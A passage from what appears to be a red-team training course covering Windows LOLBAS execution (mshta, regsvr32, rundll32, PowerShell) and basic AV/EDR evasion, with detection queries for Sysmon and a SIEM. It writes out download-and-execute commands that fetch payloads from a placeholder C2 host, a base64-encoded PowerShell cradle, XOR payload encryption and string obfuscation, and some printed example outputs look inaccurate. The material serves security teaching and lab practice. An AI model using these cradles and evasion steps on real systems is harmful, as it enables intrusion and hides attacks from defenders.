simple payload and setting up the initial delivery mechanism. Understanding these different vectors is crucial because real adversaries tailor their approach based on the target environment and their access.\r\n\r\nIn the next module, Module 5, we're going to take this hosted payload and *execute* it on our target machine using some of those built-in Windows binaries we talked about (LOLBAS). This is where we'll see our first simulated \"compromise\" and observe what it looks like in our logging infrastructure!\r\n\r\nGet your `run_calc.hta` file ready on your web server. We're about to light the fuse!"
    },
    {
      "title": "module_5",
      "description": "module_5 Overview",
      "order": 5,
      "content": "Alright team, buckle up! We've laid the groundwork, built our digital playground, set up our comms tower, and even prepped our little packages of code. Now? Now is where the rubber meets the road. This is Module 5: Initial Execution and Callbacks. This is the moment we get our code running on a target system and establish that crucial first link back to our C2 infrastructure. Think of it as landing the drone and getting the first blurry video feed back to base. It's exciting, it's challenging, and it's where we start to see the fruits of our planning and infrastructure work!\r\n\r\n---\r\n\r\n## CRTO Prep Part 1: Adversary Simulation Foundations\r\n\r\n### Module 5: Initial Execution and Callbacks\r\n\r\n**Overall Module Objective:** By the end of this module, learners will be able to execute a payload on a target machine using Living Off The Land Binaries/Scripts (LOLBAS) and establish a functional initial callback to their C2 infrastructure, observing the activity in their logging system.\r\n\r\n**Why is this Module Critical?**\r\n\r\nGetting your code to run on a target machine is the *goal* of Initial Access. Without successful execution, all the fancy infrastructure and perfectly crafted payloads are useless. This module dives into *how* attackers achieve that first execution, focusing on techniques that leverage tools already present on the system to blend in – the \"Living Off The Land\" philosophy. We'll also see how that initial connection (\"the callback\") looks and, importantly, how defenders might spot it using the logs we set up in Module 2.\r\n\r\n---\r\n\r\n#### **Essential Subtopics Deep Dive:**\r\n\r\nLet's break down each key concept and get our hands dirty (metaphorically, for now!).\r\n\r\n##### **5.1 Understanding Living Off The Land Binaries and Scripts (LOLBAS)**\r\n\r\n*   **What are LOLBAS/LOLBINS?**\r\n    *   These are legitimate Windows executables, scripts, or libraries that are part of the standard operating system installation.\r\n    *   Think of tools like `powershell.exe`, `cmd.exe`, `mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `bitsadmin.exe`, `certutil.exe`, etc.\r\n*   **Why do attackers use them?**\r\n    *   **Stealth:** They are signed Microsoft binaries. Security software (AV/EDR) is less likely to flag the *binary itself* as malicious. Detection has to rely on *how* the binary is used (command line, network connections, behavior).\r\n    *   **Availability:** They are always there on a standard Windows install. No need to drop extra tools that might be fingerprinted or caught by static analysis.\r\n    *   **Functionality:** Many LOLBAS provide powerful capabilities like downloading files, executing code, interacting with the network, modifying the registry, etc. Attackers can chain these together to perform complex tasks.\r\n*   **The Philosophy:** It's about minimizing the attacker's footprint and relying on the victim's own tools against them. Instead of bringing a crowbar (custom malware), you use a screwdriver that was already in the toolbox (LOLBAS).\r\n*   **Resource:** The LOLBAS Project website (lolbas-project.github.io) is an *invaluable* resource. It's a community-driven repository documenting how attackers have abused these legitimate binaries and scripts. Get familiar with it!\r\n\r\n##### **5.2 Using `mshta.exe` for Execution**\r\n\r\n*   **What it is:** Microsoft HTML Application host. It's designed to run `.hta` files, which are basically HTML pages that can contain scripting languages like VBScript or JScript.\r\n*   **Why attackers use it:** `mshta.exe` can execute scripts directly from a *remote URL*. This is a classic technique because it allows execution without writing a script file to disk first (though the HTA content itself is often cached). It bypasses execution policies that might affect `.vbs` or `.js` files directly.\r\n*   **Common Syntax:**\r\n    ```bash\r\n    mshta.exe <path_to_hta_file_or_url>\r\n    ```\r\n    Or, to execute inline script (often used with `javascript:` or `vbscript:` pseudo-protocols):\r\n    ```bash\r\n    mshta.exe javascript:<code>\r\n    mshta.exe vbscript:<code>\r\n    ```\r\n*   **Examples:**\r\n    *   **Executing a remote HTA file:** If you hosted `payload.hta` on your C2 web server (`http://<your_c2_ip>/payload.hta`):\r\n        ```bash\r\n        mshta http://<your_c2_ip>/payload.hta\r\n        ```\r\n    *   **Executing inline VBScript:** This example pops a message box and then closes the `mshta` window.\r\n        ```bash\r\n        mshta vbscript:Execute(\"MsgBox \"\"Hello from MSHTA!\"\":close\")\r\n        ```\r\n    *   **Executing a remote scriptlet (.sct) via MSHTA (less common now, but conceptually similar to regsvr32):**\r\n        ```bash\r\n        mshta javascript:GetObject(\"script:http://<your_c2_ip>/payload.sct\")(window.close)\r\n        ```\r\n*   **Detection Focus:** Look for `mshta.exe` process creation. *Crucially*, examine the command line arguments. Is it pointing to a remote URL? Is it executing suspicious inline script? Sysmon Event ID 1 (Process Create) is your friend here. Also, Sysmon Event ID 3 (Network Connection) will show the connection to download the HTA or scriptlet.\r\n\r\n##### **5.3 Using `rundll32.exe` for Executing DLL Entry Points**\r\n\r\n*   **What it is:** A legitimate Windows utility used to load and run functions from 32-bit Dynamic Link Libraries (DLLs). It's not a standalone program runner; it needs a DLL and a specific function within that DLL to execute.\r\n*   **Why attackers use it:** Attackers can craft malicious DLLs with specific exported functions (`DllRegisterServer`, `DllInstall`, or custom functions) that contain their payload code. Running this via `rundll32` makes the execution appear to originate from a standard Windows binary, potentially evading detection based purely on the executable name.\r\n*   **Common Syntax:**\r\n    ```bash\r\n    rundll32.exe <dllname>,<entrypoint> <optional_arguments>\r\n    ```\r\n    The `<entrypoint>` is the name of the exported function in the DLL that `rundll32` will call. `DllRegisterServer` and `DllInstall` are common choices because they are standard export names, making the command line look less immediately suspicious.\r\n*   **Examples:**\r\n    *   **Executing a custom malicious DLL:** If you have a malicious DLL named `evil.dll` in `C:\\temp` with an exported function `EntryPoint`:\r\n        ```bash\r\n        rundll32.exe C:\\temp\\evil.dll,EntryPoint\r\n        ```\r\n    *   **Executing using a standard export name:**\r\n        ```bash\r\n        rundll32.exe C:\\temp\\evil.dll,DllRegisterServer\r\n        ```\r\n*   **Detection Focus:** `rundll32.exe` process creation (Sysmon Event ID 1). *Again*, the command line is key – what DLL is it loading? Is the DLL path suspicious (e.g., in a temporary directory)? Sysmon Event ID 7 (Image Load) is *critical* here, showing what DLLs are loaded into the `rundll32.exe` process. Look for unfamiliar or suspicious DLLs loaded by `rundll32`.\r\n\r\n##### **5.4 Using `regsvr32.exe` for Executing COM Scriptlets**\r\n\r\n*   **What it is:** A command-line utility to register and unregister OLE controls (like DLLs and ActiveX controls) in the Windows Registry.\r\n*   **Why attackers use it:** `regsvr32.exe` can execute Scriptlets (`.sct` files) via the `/i` flag when used with `scrobj.dll`. Similar to `mshta`, this allows executing scripts (VBScript/JScript) potentially hosted on a remote server, often bypassing traditional script execution restrictions. This was a significant bypass technique for a while.\r\n*   **Common Syntax:**\r\n    ```bash\r\n    regsvr32.exe /s /n /u /i:<url_to_sct_file> scrobj.dll\r\n    ```\r\n    *   `/s`: Silent mode (no message boxes).\r\n    *   `/n`: Do not call `DllRegisterServer`.\r\n    *   `/u`: Unregister the DLL (this is counter-intuitive but necessary for the `/i` flag to work with `scrobj.dll`).\r\n    *   `/i:<url>`: Call `DllInstall` and pass the URL as a parameter.\r\n    *   `scrobj.dll`: The COM object that knows how to process `.sct` files.\r\n*   **Examples:**\r\n    *   **Executing a remote SCT file:** If you hosted `payload.sct` on your C2 web server:\r\n        ```bash\r\n        regsvr32 /s /n /u /i:http://<your_c2_ip>/payload.sct scrobj.dll\r\n        ```\r\n*   **Detection Focus:** `regsvr32.exe` process creation (Sysmon Event ID 1). Look for the presence of `scrobj.dll` and the `/i` flag with a URL in the command line. Sysmon Event ID 3 (Network Connection) will show the download of the `.sct` file.\r\n\r\n##### **5.5 Other Common LOLBAS for Execution (`powershell.exe`, `cscript.exe`, `wscript.exe`)**\r\n\r\n*   **`powershell.exe`:**\r\n    *   **What it is:** Microsoft's task automation and configuration management framework shell.\r\n    *   **Why attackers use it:** It's incredibly powerful, has access to the full .NET framework, can interact deeply with the OS, download/upload files, execute code in memory, and much more. It's the go-to tool for many post-exploitation tasks and initial execution.\r\n    *   **Key Execution Flags:**\r\n        *   `-NoProfile`: Skips loading the PowerShell profile, making execution faster and potentially avoiding detection based on profile modifications.\r\n        *   `-WindowStyle Hidden`: Prevents a PowerShell window from popping up.\r\n        *   `-ExecutionPolicy Bypass`: Allows scripts to run, bypassing the configured execution policy.\r\n        *   `-EncodedCommand <base64>`: Executes a base64 encoded string as a PowerShell command. This is a common obfuscation technique for command lines.\r\n        *   `-c` or `-Command`: Executes the specified command(s).\r\n    *   **Examples:**\r\n        *   **Simple Command (hidden):**\r\n            ```bash\r\n            powershell.exe -WindowStyle Hidden -Command \"Write-Host 'Hello from PowerShell!'\"\r\n            ```\r\n        *   **Download and Execute (In-Memory):** This is a very common pattern. `New-Object Net.WebClient` downloads content, `DownloadString` gets it as a string, and `IEX` (Invoke-Expression) executes that string as PowerShell code.\r\n            ```bash\r\n            powershell.exe -WindowStyle Hidden -Exec Bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://<your_c2_ip>/payload.ps1')\"\r\n            ```\r\n        *   **Executing an Encoded Command:** First, encode a command: `[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"Write-Host 'Hello Encoded!'\"))` (Note: PowerShell uses UTF-16 Little Endian for encoding). Then execute:\r\n            ```bash\r\n            powershell.exe -WindowStyle Hidden -Exec Bypass -EncodedCommand <paste_base64_here>\r\n            ```\r\n    *   **Detection Focus:** `powershell.exe` process creation (Sysmon Event ID 1). Command line analysis (Sysmon Event ID 1, Security Event ID 4688). *Crucially*, PowerShell Script Block Logging (Event ID 4104) can capture the *deobfuscated* script content being executed, even if the command line is encoded. AMSI (Antimalware Scan Interface) is also designed to hook into PowerShell and scan scripts *before* they execute (more on bypassing this later).\r\n*   **`cscript.exe` and `wscript.exe`:**\r\n    *   **What they are:** Script hosts for VBScript and JScript files (`.vbs`, `.js`, `.wsf`). `cscript` is the command-line version, `wscript` is the GUI version.\r\n    *   **Why attackers use them:** Can execute script files, potentially downloaded from a remote source. Similar to `mshta` but typically requires the script file to be present locally (though techniques exist to execute remotely).\r\n    *   **Syntax:**\r\n        ```bash\r\n        cscript.exe <path_to_script_file>\r\n        wscript.exe <path_to_script_file>\r\n        ```\r\n    *   **Examples:**\r\n        *   **Executing a downloaded VBScript:**\r\n            ```bash\r\n            cscript C:\\temp\\payload.vbs\r\n            ```\r\n    *   **Detection Focus:** `cscript.exe` or `wscript.exe` process creation (Sysmon Event ID 1). Command line analysis showing the script path. File creation logs if the script was downloaded.\r\n\r\n##### **5.6 Command Line Execution Techniques and Obfuscation**\r\n\r\n*   **Why Obfuscate Command Lines?** Defenders and security tools heavily monitor command lines. Default or simple malicious command lines (like a direct URL download) are easy to spot. Obfuscation aims to make the command line look benign or confusing to automated tools and human analysts.\r\n*   **Basic Techniques (beyond PowerShell -EncodedCommand):**\r\n    *   **Using Environment Variables:** Instead of `C:\\temp\\payload.exe`, use `%TEMP%\\payload.exe`.\r\n    *   **Concatenation:** Break up strings using variables or string manipulation within scripts or batch files (e.g., `set p=power & set s=shell.exe & %p%%s% ...`). This is less effective against modern EDR but a foundational concept.\r\n    *   **Shortening/Changing Case:** Using 8.3 filenames (`PROGRA~1` instead of `Program Files`), changing case (`MsHtA` instead of `mshta`). Again, less effective standalone but part of a layered approach.\r\n    *   **Encoding (outside of PowerShell):** Simple base64 or hex encoding of strings *within* a script or configuration file that is then decoded by the script/tool itself.\r\n*   **Think About:** How would you make `mshta http://<your_c2_ip>/payload.hta` slightly harder to spot on the command line? Maybe store the URL in a variable in a batch file that then calls `mshta`? `set url=http://<your_c2_ip>/payload.hta & mshta %url%` (Still simple, but you get the idea).\r\n*   **Detection Focus:** This is an arms race. Security tools look for patterns, known malicious strings, high-entropy encoded strings, and analyze the *behavior* initiated by the command (network connections, file modifications, process injection, etc.) rather than just the literal string.\r\n\r\n##### **5.7 Understanding the Initial Callback Process**\r\n\r\n*   **What is a Callback?** After your payload executes on the target machine, it needs to communicate *back* to your C2 server to receive further instructions and send back collected data. This initiated connection from the victim to the attacker is the \"callback.\"\r\n*   **Why Callback (vs. Bind Shell)?** A \"bind shell\" opens a listener on the target, and the attacker connects *to* it. This is often blocked by firewalls (inbound connections are heavily restricted). A \"reverse shell\" or \"callback\" initiates the connection *outbound* from the target to the attacker's listener. Outbound connections (especially on standard ports like 80, 443, 53) are much more likely to be allowed by firewalls.\r\n*   **The Process Flow:**\r\n    1.  Payload executes on Target VM (Module 5).\r\n    2.  The payload's code includes instructions to connect back to a specific IP address and port (your C2 or Redirector IP/Port, configured in Module 4 payload).\r\n    3.  The Target VM initiates an outbound network connection (e.g., TCP SYN) to your Redirector IP/Port (Module 3).\r\n    4.  The Redirector (e.g., Apache/Nginx with mod_rewrite/proxy_pass, or Socat) receives the connection.\r\n    5.  The Redirector forwards the connection to your actual C2 Server's internal IP/Port (Module 3).\r\n    6.  Your C2 Framework (e.g., Mythic, Sliver, or conceptually, your simple listener) receives the incoming connection.\r\n    7.  If the C2 framework recognizes the connection as a valid implant beacon (based on malleable profile settings, if any - Module 7), it establishes the session.\r\n    8.  You now have a \"shell\" or \"beacon\" from the target machine in your C2 framework interface. Success!\r\n*   **Role of the Redirector:** The redirector is crucial OpSec (Operational Security). It hides the real IP address of your C2 server. If the target organization or security researchers identify the connection and investigate the IP, they hit your disposable redirector, not your main C2 server, which preserves your main infrastructure for future operations.\r\n*   **Detection Focus:** This is where network monitoring comes in. Sysmon Event ID 3 (Network Connection) is the primary source. Look for outbound connections from suspicious processes (identified in Event ID 1) to external IPs/ports that are unusual for that process or machine. Firewall logs, network IDS/IPS alerts would also fire here.\r\n\r\n##### **5.8 Monitoring Initial Execution and Callbacks in the SIEM (Splunk/ELK)**\r\n\r\n*   **Recap:** You built a lab with a Domain Controller, a Target Workstation, installed Sysmon on the workstation, and set up log forwarding to Splunk Free or ELK in Module 2. Now we use it!\r\n*   **What to Search For:**\r\n    *   **Execution:**\r\n        *   **Search Query Concept:** Find process creation events originating from interactive logon sessions or suspicious sources, where the `Image` (process name) is one of our target LOLBAS (`mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `powershell.exe`, `cscript.exe`, `wscript.exe`).\r\n        *   **Splunk Example:** `EventCode=1 OR EventCode=4688 | where Image=\"*\\\\mshta.exe\" OR Image=\"*\\\\rundll32.exe\" OR Image=\"*\\\\regsvr32.exe\" OR Image=\"*\\\\powershell.exe\" OR Image=\"*\\\\cscript.exe\" OR Image=\"*\\\\wscript.exe\" | table _time, Hostname, Image, CommandLine, ParentCommandLine`\r\n        *   **ELK Example (using KQL in Kibana Discover):** `event.code : (1 or 4688) and process.executable : (*\\\\mshta.exe or *\\\\rundll32.exe or *\\\\regsvr32.exe or *\\\\powershell.exe or *\\\\cscript.exe or *\\\\wscript.exe)` - then inspect the `process.command_line` field.\r\n        *   **What to Analyze:** Look closely at the `CommandLine` field for the LOLBAS. Does it contain URLs? Suspicious paths? Base64 encoded strings? Unusual flags?\r\n    *   **Callback:**\r\n        *   **Search Query Concept:** Find network connection events (`Sysmon Event ID 3`) where the `SourceImage` (the process that initiated the connection) is one of the processes identified in the execution phase, and the `DestinationIP` and `DestinationPort` match your C2/Redirector.\r\n        *   **Splunk Example:** `EventCode=3 | where SourceImage=\"*\\\\mshta.exe\" OR"
    },
    {
      "title": "module_6",
      "description": "module_6 Overview",
      "order": 6,
      "content": "Alright team, settle in! We've built our lab, set up our C2 infrastructure, crafted our initial payload, and even achieved that crucial first callback. That's massive progress! You've got code running on a target machine talking back to your server – a true beachhead.\r\n\r\nBut here's the reality check: Defenders aren't sitting idle. They have tools and systems designed specifically to spot malicious activity. If our payload is screaming \"BAD!\" or our communication looks completely alien, that beachhead is going to get wiped out fast.\r\n\r\nThis is where **evasion** comes in. It's not about being invisible; it's about blending in, looking less suspicious, and making it harder for security tools to identify our actions as malicious. In this module, we're laying the *foundational* bricks of evasion – understanding *why* things get caught and applying basic techniques to fly under the radar of common defenses. This isn't the deep magic yet, but it's the essential first step to making your simulations more realistic and persistent.\r\n\r\nLet's dive deep and learn how to make our initial access a little less... obvious.\r\n\r\n---\r\n\r\n## CRTO Prep Part 1: Adversary Simulation Foundations\r\n\r\n### Module 6: Foundational Evasion Techniques\r\n\r\n*   **Module Objective:** By the end of this module, learners will understand basic detection vectors and apply fundamental techniques to evade common security controls like Antivirus (AV) and basic Endpoint Detection and Response (EDR) signatures.\r\n\r\n---\r\n\r\n#### 6.1 The Adversary's Challenge: Understanding Detection\r\n\r\nBefore we can evade detection, we need to understand *how* detection works. Think of security tools like watchful guards looking for specific things. What are they looking for?\r\n\r\n*   **Antivirus (AV):** Traditionally focused on *signatures*. It has a database of known malicious files (like a list of fingerprints). If a file's hash or a specific sequence of bytes within a file matches an entry in the database, *BAM!* Detected. Modern AVs also use *heuristics* (looking for suspicious *characteristics* or *patterns* in code, even if the specific signature isn't known) and some behavioral analysis.\r\n*   **Endpoint Detection and Response (EDR):** These are more sophisticated. They focus heavily on *behavior*. They monitor processes, network connections, file system changes, registry modifications, API calls, and much more. They look for sequences of events that, when chained together, look like known malicious activity (Threat Hunting Rules, Behavioral Analytics). They often leverage advanced logging like ETW (Event Tracing for Windows) and integrate with centralized logging systems (SIEMs) for correlation.\r\n\r\n**Common Detection Vectors (Where security tools look):**\r\n\r\n1.  **File Signatures:** The bytes on disk or in memory that match a known bad file. (e.g., `msfvenom` defaults are often heavily signatured).\r\n2.  **In-Memory Signatures:** Malicious code loaded directly into memory might have patterns that AV/EDR can scan for within the process's memory space.\r\n3.  **API Hooking / Monitoring:** Attackers often use specific Windows API functions (like `CreateRemoteThread`, `WriteProcessMemory`, `NtAllocateVirtualMemory`) to perform malicious actions (like process injection). Security tools can \"hook\" these functions or monitor their usage by processes to spot suspicious activity.\r\n4.  **Command Line Analysis:** The arguments passed to legitimate Windows binaries (LOLBAS) or scripts can be highly indicative of malicious intent. Running `powershell -exec bypass -encodedcommand <base64_string>` is a classic example that's heavily monitored.\r\n5.  **Network Traffic Analysis:** C2 communication often has patterns (specific headers, timings, domain names, encryption ciphers) that don't look like normal user traffic. (We touched on this with Malleable C2 in Module 7, but the concept applies here too).\r\n\r\nOur goal in this module is to introduce techniques that make our payloads and execution methods less noisy or detectable across some of these vectors, focusing initially on File/Memory (basic) and Command Line.\r\n\r\n#### 6.2 Basic Payload Obfuscation Techniques\r\n\r\nObfuscation is about making something harder to understand or analyze, both for humans and for automated tools. We're not aiming for perfect stealth yet, just making the *initial* detection harder.\r\n\r\n**6.2.1 Simple Encoding (Base64, Hex)**\r\n\r\nEncoding converts data into a different format using a public standard. It's *not* encryption (it doesn't use a secret key). Anyone can decode it.\r\n\r\n*   **Why use it?** It changes the raw bytes of your payload or command, potentially bypassing simple signature checks that look for specific byte sequences. It also makes command lines look less immediately readable, sometimes fooling naive monitoring that doesn't automatically decode.\r\n*   **Limitations:** It's easily decoded by security tools and analysts. It doesn't change the *behavior* of the code once executed. Base64 encoding actually makes the data *larger*, which can sometimes be suspicious in itself.\r\n\r\n**Example: Encoding a PowerShell Command**\r\n\r\nLet's say our payload execution command involves a simple PowerShell script block:\r\n\r\n```powershell\r\nIEX (New-Object Net.WebClient).DownloadString('http://your.c2.com/payload.ps1')\r\n```\r\n\r\nThis string `New-Object Net.WebClient` is very common and might be flagged. We can encode the *entire command block* (`IEX ... payload.ps1`) using Base64.\r\n\r\n1.  **Get the bytes:** Convert the string to UTF-16 Little Endian bytes (required for PowerShell's `-EncodedCommand`).\r\n2.  **Base64 Encode:** Encode the bytes into a Base64 string.\r\n\r\n**Python Example:**\r\n\r\n```python\r\nimport base64\r\nimport sys\r\n\r\ncommand = \"IEX (New-Object Net.WebClient).DownloadString('http://your.c2.com/payload.ps1')\"\r\n\r\n# PowerShell -EncodedCommand requires UTF-16 Little Endian\r\ncommand_bytes = command.encode('utf-16le')\r\n\r\n# Base64 Encode\r\nencoded_command = base64.b64encode(command_bytes).decode('ascii')\r\n\r\nprint(f\"Original Command: {command}\")\r\nprint(f\"Base64 Encoded: {encoded_command}\")\r\n\r\n# How you'd execute this in PowerShell:\r\n# powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand <encoded_command_output>\r\n```\r\n\r\n*   **Output:**\r\n    ```\r\n    Original Command: IEX (New-Object Net.WebClient).DownloadString('http://your.c2.com/payload.ps1')\r\n    Base64 Encoded: SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAJACcAaAB0AHQAcAA6AC8ALwB5AG8AdQByAC4AYwAyAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAAoA\r\n    ```\r\n\r\nNow, instead of executing the original command directly, you'd use:\r\n\r\n```powershell\r\npowershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAJACcAaAB0AHQAcAA6AC8ALwB5AG8AdQByAC4AYwAyAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAAoA\r\n```\r\n\r\nThis looks like gibberish on the command line, potentially bypassing simple text-based rules. However, EDRs are smart enough to hook `powershell.exe` and log the *decoded* command block, and AMSI (discussed next) will scan the decoded script *before* it runs. So, this is minimal evasion, primarily against simple command line monitoring or static file analysis.\r\n\r\n**6.2.2 XOR and Simple Encryption**\r\n\r\nXOR (Exclusive OR) is a simple bitwise operation. It's often used for basic encryption because applying the same key twice reverses the operation (`A XOR Key = B`, then `B XOR Key = A`).\r\n\r\n*   **Why use it?** It changes the raw bytes of your payload significantly, making signature detection much harder. The payload on disk or in memory (before decryption) won't match known bad patterns.\r\n*   **Limitations:** You need a small \"stub\" of code (the decoder) that is *not* XORed to perform the decryption. This stub itself can be detected. The key needs to be embedded somewhere, potentially discoverable. More sophisticated analysis can sometimes identify XORed data by looking at byte frequency distributions.\r\n\r\n**Conceptual Example:**\r\n\r\nInstead of hosting `payload.exe`, you XOR `payload.exe` with a key and host `payload.xor`. Your launcher code would:\r\n\r\n1.  Download `payload.xor`.\r\n2.  Use the hardcoded key to XOR the data back into `payload.exe` in memory.\r\n3.  Execute the payload directly from memory (more advanced, related to process injection concepts) or write it to a temporary location and execute (riskier, creates a file on disk).\r\n\r\n**Python Example (XORing a simple string):**\r\n\r\n```python\r\ndef xor_encrypt_decrypt(data, key):\r\n    # Ensure key is bytes\r\n    key_bytes = key.encode('utf-8') if isinstance(key, str) else key\r\n    # Ensure data is bytes\r\n    data_bytes = data.encode('utf-8') if isinstance(data, str) else data\r\n\r\n    key_len = len(key_bytes)\r\n    encrypted_data = bytearray()\r\n    for i in range(len(data_bytes)):\r\n        encrypted_data.append(data_bytes[i] ^ key_bytes[i % key_len])\r\n    return bytes(encrypted_data)\r\n\r\nkey = \"mysecretkey\"\r\noriginal_data = \"This is a test string for XOR.\"\r\n\r\n# Encrypt\r\nencrypted = xor_encrypt_decrypt(original_data, key)\r\nprint(f\"Original: {original_data}\")\r\nprint(f\"Key: {key}\")\r\nprint(f\"Encrypted (bytes): {encrypted}\")\r\nprint(f\"Encrypted (hex): {encrypted.hex()}\") # Often easier to see the bytes\r\n\r\n# Decrypt\r\ndecrypted = xor_encrypt_decrypt(encrypted, key).decode('utf-8')\r\nprint(f\"Decrypted: {decrypted}\")\r\n\r\n# Example with a small byte array (simulating payload bytes)\r\npayload_bytes = b'\\x90\\x90\\xCC\\xC3' # Example bytes (NOP, NOP, INT 3, RET)\r\nkey_bytes = b'\\xAA\\xBB'\r\nencrypted_payload = xor_encrypt_decrypt(payload_bytes, key_bytes)\r\nprint(f\"Original Payload Bytes: {payload_bytes.hex()}\")\r\nprint(f\"Key Bytes: {key_bytes.hex()}\")\r\nprint(f\"Encrypted Payload Bytes: {encrypted_payload.hex()}\")\r\ndecrypted_payload = xor_encrypt_decrypt(encrypted_payload, key_bytes)\r\nprint(f\"Decrypted Payload Bytes: {decrypted_payload.hex()}\")\r\n\r\n```\r\n\r\n*   **Output Example:**\r\n    ```\r\n    Original: This is a test string for XOR.\r\n    Key: mysecretkey\r\n    Encrypted (bytes): b'\\x01\\x0f\\x12\\x10\\x0c\\x0c\\x01\\x12^\\x05\\x1c\\x12\\x06\\x02\\x12\\x0b\\x0c\\x04\\x01^\\x01\\x12\\x10\\x10\\x06\\x17\\x01\\x0c\\x01\\x12\\x10^\\x0b\\x1c\\x0c\\x02\\x02\\x01\\x1f'\r\n    Encrypted (hex): 010f12100c0c01125e051c120602120b0c04015e011210100617010c0112105e0b1c0c0202011f\r\n    Decrypted: This is a test string for XOR.\r\n    Original Payload Bytes: 9090ccc3\r\n    Key Bytes: aabb\r\n    Encrypted Payload Bytes: 3a3a6668\r\n    Decrypted Payload Bytes: 9090ccc3\r\n    ```\r\n\r\nNotice how the encrypted bytes are completely different from the original. This is the core idea behind bypassing signature-based detection on the raw payload file.\r\n\r\n**6.2.3 String Obfuscation within Code/Scripts**\r\n\r\nInstead of having obvious strings like `\"C:\\\\Users\\\\Public\\\\payload.exe\"` or `\"New-Object Net.WebClient\"` directly in your script, you can build them dynamically or hide them.\r\n\r\n*   **Why use it?** Bypasses simple static analysis of scripts or code that looks for specific literal strings.\r\n*   **Limitations:** More complex analysis can often follow the logic and reconstruct the strings. Doesn't help if the *behavior* is detected.\r\n\r\n**PowerShell Example:**\r\n\r\nInstead of:\r\n```powershell\r\n$path = \"C:\\Temp\\malware.exe\"\r\nStart-Process $path\r\n```\r\n\r\nYou could do:\r\n```powershell\r\n$p = \"C:\\Te\"; $p += \"mp\\\"; $p += \"malware.exe\";\r\nStart-Process $p\r\n```\r\nOr even more complex:\r\n```powershell\r\n$chars = @(67, 58, 92, 84, 101, 109, 112, 92, 109, 97, 108, 119, 97, 114, 101, 46, 101, 120, 101) # ASCII values\r\n$path = [System.Text.Encoding]::ASCII.GetString($chars)\r\nStart-Process $path\r\n```\r\n\r\nThis makes it harder for a simple regex or string scan to spot the malicious path.\r\n\r\n#### 6.3 Brief Dive into Advanced Concepts (High-Level)\r\n\r\nThe CRTO focuses on practical foundational skills. While AMSI, ETW, and Process Injection are key evasion techniques, for this module, we'll cover their *purpose* and *concept* at a high level as they relate to detection and evasion, rather than diving into complex implementation details.\r\n\r\n**6.3.1 Introduction to AMSI (Antimalware Scan Interface)**\r\n\r\n*   **What it is:** AMSI is a Windows feature designed to allow applications (like PowerShell, WMI, JScript, VBScript, .NET) to pass their script/code content to the installed Antivirus/EDR *before* it gets executed by the application.\r\n*   **How it works:** When a script is about to run, or a script block is evaluated, the application sends the *unobfuscated* content to the AMSI provider (your AV/EDR). The AV/EDR scans it in real-time. If it detects something malicious (even if it was heavily obfuscated in the original file/command), it tells the application to stop execution.\r\n*   **Why it matters for evasion:** AMSI defeats many simple string obfuscation and encoding techniques *for scripting languages*, because it scans the *decoded, deobfuscated* content.\r\n*   **Bypass Concepts (High-Level):** Bypassing AMSI typically involves finding ways to interfere with the AMSI scanning process *in memory* before your malicious code is sent to it. This often involves reflecting on the `Amsi.dll` in memory and patching functions or manipulating its state. *This is a more advanced technique and beyond the scope of foundational implementation here, but understand its purpose.*\r\n\r\n**6.3.2 Introduction to ETW (Event Tracing for Windows)**\r\n\r\n*   **What it is:** ETW is a high-performance, kernel-level tracing facility built into Windows. It's used by many system components and applications to log detailed events.\r\n*   **How it works:** Security products, especially EDRs, are major consumers of ETW events. They subscribe to specific ETW providers (like the Microsoft-Windows-Threat-Intelligence provider, or providers related to PowerShell, .NET, etc.) to get rich telemetry about what's happening on the system – process creation details, command lines, network connections, loaded modules, registry changes, and even details about API calls.\r\n*   **Why it matters for evasion:** EDRs build their behavioral detection and threat hunting capabilities on top of this detailed ETW data. If your actions generate specific sequences of ETW events that look malicious, you'll get caught.\r\n*   **Bypass Concepts (High-Level):** Bypassing ETW often involves patching functions that write events to ETW buffers *in memory* within your process or the process you inject into. This prevents the telemetry from ever reaching the EDR. *Again, this is an advanced technique, but understand that EDRs rely heavily on this low-level tracing.*\r\n\r\n**6.3.3 Understanding Process Injection (Basics)**\r\n\r\n*   **What it is:** Process injection is a technique where you execute arbitrary code within the address space of another process.\r\n*   **Why it's used for evasion:** The primary goal is to hide your malicious activity within a legitimate, trusted process (like `explorer.exe`, `svchost.exe`, `notepad.exe`). If the malicious code runs under the guise of a trusted process, it can potentially evade defenses that monitor *your* initial malicious process or block untrusted executables.\r\n*   **Common Techniques Overview (Concept & Purpose):**\r\n    *   **Remote Threads:** Allocate memory in a target process, write your malicious code (shellcode) there, and create a new thread in the target process to start executing your code.\r\n    *   **APC (Asynchronous Procedure Call):** Queue a function call (pointing to your shellcode) to be executed by an *existing* thread in the target process when that thread enters an alertable state.\r\n    *   **Process Hollowing:** Create a new instance of a legitimate process in a suspended state, unmap its original code, write your malicious code into its memory space, change its context to point to your code, and resume the thread.\r\n*   **How it relates to evasion:** By running your payload (like a C2 implant) inside `explorer.exe`, network connections originating from `explorer.exe` might look less suspicious than if they came from `my_malware.exe`. API calls made by your code are attributed to the target process. *Implementing process injection is typically beyond foundational CRTO, but understanding *that* it's an evasion technique and *why* (blending into trusted processes) is important.*\r\n\r\n#### 6.4 Testing Payloads Against Basic Controls\r\n\r\nHow do you know if your evasion worked? You test!\r\n\r\n*   **Using a Lab AV Instance:** If you installed a test Antivirus on your lab workstation (Module 2), you can try dropping your obfuscated payload file onto the desktop or executing your obfuscated command. Does the AV flag it? Observe the pop-ups or the AV logs.\r\n*   **Using Public Scanners (VirusTotal - CAREFULLY!):** VirusTotal scans files with dozens of AV engines. It also shows you strings, imports, and behavioral information observed during sandboxed execution.\r\n    *   **CAUTION:** *Never* upload a payload you intend to use in a real engagement or a 